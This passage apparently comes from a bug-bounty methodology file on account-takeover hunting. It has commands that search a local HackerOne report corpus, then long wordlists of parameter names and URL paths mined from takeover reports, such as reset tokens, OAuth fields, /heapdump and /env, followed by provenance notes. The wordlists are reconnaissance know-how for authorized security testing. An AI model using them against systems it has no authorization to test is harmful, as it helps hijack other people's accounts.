python3 ~/.local/share/hackerone-reports/h1.py search "wordpress" --class account-takeover

python3 ~/.local/share/hackerone-reports/h1.py search "reset token" --class account-takeover --min-bounty 1000

```

## Corpus wordlists (mined)

### `params_account-takeover.txt`

```text
username
month
year
template
template[]
url
email
redirectUrl
token
userId
p_datasource_data
switch
ticket_id
canary
password
continue
PositionTitleIds
Title
FirstName
MiddleName
LastName
PhoneNumber
LanguageId
Password
ConfirmPassword
passChange
PersonProfileId
CitizenshipId
__RequestVerificationToken
reset_password_token
start
char
oauth_token
id
key
code
rt
authenticity_token
next
challenge
challenge_answer
two
three
header
input
name
cookie
redirect_after_login
csrf
popup
petIncluded
filterByTotalPrice
ssr
state
_method
openid.ns
openid.mode
openid.return_to
openid.claimed_id
openid.identity
openid.ns.ax
openid.ax.mode
openid.assoc_handle
openid.response_nonce
openid.signed
openid.op_endpoint
openid.ax.type.email
openid.ax.type.fullname
openid.ax.type.nickname
openid.sig
ws
hmac
host
locale
session
shop
timestamp
domain
Action
Domain
Suffix
redirect
osf
ms
mo
pg
sepg
fi
fs
ft
pu
has
as
saa
po
pi
pc
co
ci
p_action
ll
p_otype
p_request
p_minusimage
p_plusimage
p_headerimage
p_show_banner
p_show_cancel
p_open_item
p_open_items
p_domain
p_sub_domain
p_title
dest
user_id
_csrf_token
janrain_nonce
content
csrfmiddlewaretoken
back_to
callbackUrl
value
maxAge
app_type
page
redirect_url
enable_registration
redirectTo
referrer_page_location
RelayState
client_id
redirect_uri
response_type
scope
action
msisdn
otp
openid.realm
openid.ax.value.email
openid.ax.value.fullname
openid.ax.value.nickname
openid.pape.auth_level.nist
authComplete
Seq
HTTP_HOST
HTTPS
SERVER_NAME
dbPath
RepId
QUERY_STRING_DECODED
```

### `paths_account-takeover.txt`

```text
/login
/redirect
/account/profile/edit
/api/v1/users.info
/confirm_email
/fc/access
/cookies
/portal/page/portal/TOPLEVELSITE/SearchResults/PerspectiveResults
/portal/pls/portal/PORTAL.wwexp_render.show_tree
/accounts/autologin/
/api.bountypay.h1ctf.com
/uploads
/BountyPay.apk
/api
/admin/report
/pre
/accounts
/F8gHiqSdpK
/h1
/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba
/statements
/admin/upgrade
/api/staff
/login/
/users/invite-user.php
/users/list-users.php
/transfer_auth
/signup/email
/app/bugcrowd-iambull-2_gitlabcom_1/exk1lit3jovMjvewh0h8/sso/saml
/site/oauth2/authorize
/users
/account/register
/google/verify.phtml
/documentation/api/v1
/api/applications
/domains/new.php
/forgotpassword/
/accounts/reset/
/graphql
/sign-in
/MOS/
/EditUserProfile
/password
/password/edit
/accounts/password
/admin
/r/
/accounts/complete/ubuntu/
/accounts/profile/
/training/app-links/deep-linking
/software.bountypay.h1ctf.com
/graphql-proxy/admin
/fabric.html
/de/cognito/
/cli/
/api/auth/facebook
/advisories/tiktok-account-takeover/
/google_connect/register
/profile_sharing
/CyberChef/
/rt/users/passwordless-signup
/upgrade
/orchestrator/v1/password_reset/start
/pocs/periscope-oauth-callback-hijack
/en/articles/9250705-scim-provisioning-for-okta
/en/articles/8490526-okta-sso-setup-via-saml
/hpanel/auth/auth-token
/i/twitter/login
/hc/en-us
/blog/account-takeover-kayak/
/minNightlyPrice/0
/traveler/profile/edit
/search/keywords:soissons-france-(xss
/heapdump
/env
/khanacademy/khanacademy
/signup
/collabs
/collabs/find-brands
/onboarding
/chapters/
/advisories/tfh-form_post-xss-ato/
/api/Account/Login/
/old/wp-login.php
/old/wp-admin/setup-config.php
/old/rce.txt
/users/auth/bitbucket/callback
/2.0/repositories/%7B766210f9-9bec-4010-9f4d-917b06661c0c%7D
/users/sign_out
/auth
/mtn_otp/index/verification/
/CheckPortal.aspx
/PKI/default.aspx
/PKI/PassReset.aspx
/PKI/PassReset1.aspx
/SessionVerify
/Me
/SessionCreate
/api/2fa
/api/2fa/verify
/en/signup/
/u/user/preferences/account
/auth/yahoo/callback
/u/testh1ay/preferences/account
/auth/yahoo/null
/account/imports/new
/session
/20002/my/access_tokens
/workspace/victim_ato.cookies
/40002/users/03frq8zae2a7m9cari0v89xua/edit
/40002/users/03frq8zae2a7m9cari0v89xua/email_addresses
/20002/account/cancellation
/wp-json/wp/v2/users/15
/www.mtn.com
/wp
/v2
/wp-json
/852585B6003EBA25/forgotpassword.html
/__852585b6003eba25.nsf/forgotpassword.html
/draw
/api/v1/
/api/v1/users.list
/reset-password/%5Breset_hash%5D
/web/20220126180109/https://hackerone.engineering/
/badoo.html
/settings
/chrome-push-stats
/name=
/OmerGil/web-cache-deception-attack
/X-Discourse-Username
/users/
/preferences/email.json
/x-www-form-urlencoded
/u/
/resetpassword
/invite_links
/accounts/invitation/accept
/admin/shops/19596/accounts/5182510
/admin/shops/19596/accounts/
/send_invite
/admin/shops/19596/accounts/5182518
/authorize
/mcp-server-portal-xss-to-ato
/cms/reader/account
/forgot
/confirm_device
/member/updatesecurityquestions
/████████/default.asp
/default.asp
/████/default.asp
```

## Source skills merged into this topic

- `h1skills` — `hackerone-account-takeover`
- `hunting` — `account-takeover`
- `cbh` — `hunt-ato`

## Provenance

- `references/unified-method.md` — same deduplicated union as this file, for tooling
- `references/upstream-*.md` — unmodified original SKILL.md from each repo
- `references/upstream-assets/` — 2 companion files
- `../../upstream/` — complete unmodified archives of all five source repositories
- `bbhunt-methodology` — orchestrator, state machine and class router
